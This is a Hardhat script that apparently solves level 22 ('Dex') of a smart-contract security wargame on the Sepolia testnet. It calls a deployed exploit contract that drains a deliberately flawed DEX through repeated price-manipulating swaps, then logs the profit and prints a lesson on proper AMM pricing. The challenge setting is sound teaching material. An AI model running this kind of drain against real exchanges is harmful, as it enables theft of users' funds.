import { ethers } from "hardhat";

/**
 * Execute the Dex exploit to drain funds through price manipulation
 * 
 * Usage:
 * DEX_EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xYourDexAddress npx hardhat run scripts/level-22-dex/execute-dex-exploit.ts --network sepolia
 */
async function main() {
  console.log("Executing Dex exploit...");
  
  // Get the addresses from environment
  const exploitAddress = process.env.DEX_EXPLOIT_ADDRESS;
  const targetAddress = process.env.TARGET_ADDRESS;
  
  if (!exploitAddress) {
    throw new Error("Environment variable DEX_EXPLOIT_ADDRESS must be set");
  }
  
  if (!targetAddress) {
    throw new Error("Environment variable TARGET_ADDRESS must be set");
  }
  
  // Get the signer account
  const [signer] = await ethers.getSigners();
  console.log(`Using signer account: ${signer.address}`);
  
  try {
    // Connect to the contracts
    const dexExploit = await ethers.getContractAt("DexExploit", exploitAddress);
    const dex = await ethers.getContractAt("Dex", targetAddress);
    
    // Get token addresses
    const token1Address = await dex.token1();
    const token2Address = await dex.token2();
    console.log(`Token1: ${token1Address}`);
    console.log(`Token2: ${token2Address}`);
    
    const token1 = await ethers.getContractAt("SwappableToken", token1Address);
    const token2 = await ethers.getContractAt("SwappableToken", token2Address);
    
    // Check initial state
    console.log("\n=== Initial State ===");
    const initialExploitToken1 = await token1.balanceOf(exploitAddress);
    const initialExploitToken2 = await token2.balanceOf(exploitAddress);
    const initialDexToken1 = await token1.balanceOf(targetAddress);
    const initialDexToken2 = await token2.balanceOf(targetAddress);
    
    console.log(`DexExploit balances:`);
    console.log(`  Token1: ${ethers.formatEther(initialExploitToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(initialExploitToken2)}`);
    console.log(`Dex balances:`);
    console.log(`  Token1: ${ethers.formatEther(initialDexToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(initialDexToken2)}`);
    
    if (initialDexToken1 == 0n || initialDexToken2 == 0n) {
      console.log("\n‚ö†Ô∏è  Warning: One of the tokens is already drained. The exploit has already been executed.");
      return;
    }
    
    if (initialExploitToken1 < 10 || initialExploitToken2 < 10) {
      console.log("\n‚ö†Ô∏è  Warning: DexExploit doesn't have the initial 10 tokens of each type.");
      console.log("Make sure to transfer 10 of each token to the exploit contract first.");

      if(initialExploitToken1 < 10) {
        const transfer1Tx = await token1.transfer(exploitAddress, 10);
        await transfer1Tx.wait();
        console.log("Transferred 10 token1 to DexExploit");
        
      } if(initialExploitToken2 < 10) {
        const transfer2Tx = await token2.transfer(exploitAddress, 10);
        await transfer2Tx.wait();
      }
    }
    
    // Execute the exploit
    console.log("\n=== Executing Exploit ===");
    console.log("This will perform a series of swaps to drain one token from the DEX...");
    
    const tx = await dexExploit.exploit();
    console.log("Transaction hash:", tx.hash);
    console.log("Waiting for confirmation...");
    
    const receipt = await tx.wait();
    console.log("Transaction confirmed in block:", receipt?.blockNumber || 'unknown');
    
    // Parse events to show the swap sequence
    if (receipt?.logs) {
      console.log("\n=== Swap Sequence ===");
      for (const log of receipt.logs) {
        try {
          const parsedLog = dexExploit.interface.parseLog(log);
          if (parsedLog.name === "SwapExecuted") {
            const { description, amount } = parsedLog.args;
            console.log(`${description}: ${ethers.formatEther(amount)} tokens`);
          } else if (parsedLog.name === "BalanceUpdate") {
            const { description, playerToken1, playerToken2, dexToken1, dexToken2 } = parsedLog.args;
            console.log(`  ${description}`);
            console.log(`    DexExploit: (${ethers.formatEther(playerToken1)}, ${ethers.formatEther(playerToken2)})`);
            console.log(`    Dex: (${ethers.formatEther(dexToken1)}, ${ethers.formatEther(dexToken2)})`);
          }
        } catch (e) {
          // Not an event from our contract, skip it
        }
      }
    }
    
    // Check the final state
    console.log("\n=== Final State ===");
    const finalExploitToken1 = await token1.balanceOf(exploitAddress);
    const finalExploitToken2 = await token2.balanceOf(exploitAddress);
    const finalDexToken1 = await token1.balanceOf(targetAddress);
    const finalDexToken2 = await token2.balanceOf(targetAddress);
    
    console.log(`DexExploit balances:`);
    console.log(`  Token1: ${ethers.formatEther(finalExploitToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(finalExploitToken2)}`);
    console.log(`Dex balances:`);
    console.log(`  Token1: ${ethers.formatEther(finalDexToken1)}`);
    console.log(`  Token2: ${ethers.formatEther(finalDexToken2)}`);
    
    // Calculate gains
    const token1Gain = finalExploitToken1 - initialExploitToken1;
    const token2Gain = finalExploitToken2- initialExploitToken2;
    
    console.log(`\nNet gains:`);
    console.log(`  Token1: ${ethers.formatEther(token1Gain)}`);
    console.log(`  Token2: ${ethers.formatEther(token2Gain)}`);
    
    // Verify the exploit was successful
    if (finalDexToken1 == 0n || finalDexToken2==0n) {
      console.log("\n‚úÖ Success! You have drained at least one token from the DEX!");
      
      if (finalDexToken1 == 0n) {
        console.log(`   Token1 completely drained from DEX!`);
        console.log(`   Started with: ${ethers.formatEther(initialExploitToken1)} token1`);
        console.log(`   Ended with: ${ethers.formatEther(finalExploitToken1)} token1`);
        console.log(`   Profit: ${ethers.formatEther(token1Gain)} token1`);
      } else {
        console.log(`   Token2 completely drained from DEX!`);
        console.log(`   Started with: ${ethers.formatEther(initialExploitToken2)} token2`);
        console.log(`   Ended with: ${ethers.formatEther(finalExploitToken2)} token2`);
        console.log(`   Profit: ${ethers.formatEther(token2Gain)} token2`);
      }
      
      console.log("\nüìã How the exploit worked:");
      console.log("   1. The DEX uses a flawed price formula: (amount * toBalance) / fromBalance");
      console.log("   2. This formula doesn't account for slippage or proper AMM pricing");
      console.log("   3. Each swap changes the ratio, making subsequent swaps more favorable");
      console.log("   4. By swapping back and forth repeatedly, we manipulate the price");
      console.log("   5. Eventually, we can swap a small amount for all remaining tokens");
      console.log("   6. The final swap drains the DEX completely!");
      
      console.log("\n‚ö†Ô∏è  Lesson: DEX price formulas must account for slippage and use proper AMM formulas");
      console.log("    like constant product (x * y = k) with fees to prevent manipulation.");
    } else {
      console.log("\n‚ùå Failed! The DEX still has tokens. The exploit didn't work as expected.");
      console.log("   This could be due to:");
      console.log("   - Insufficient initial token balance");
      console.log("   - Modified DEX contract");
      console.log("   - Incorrect swap sequence");
    }
    
  } catch (error) {
    console.error("Error executing Dex exploit:", error);
    throw error;
  }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
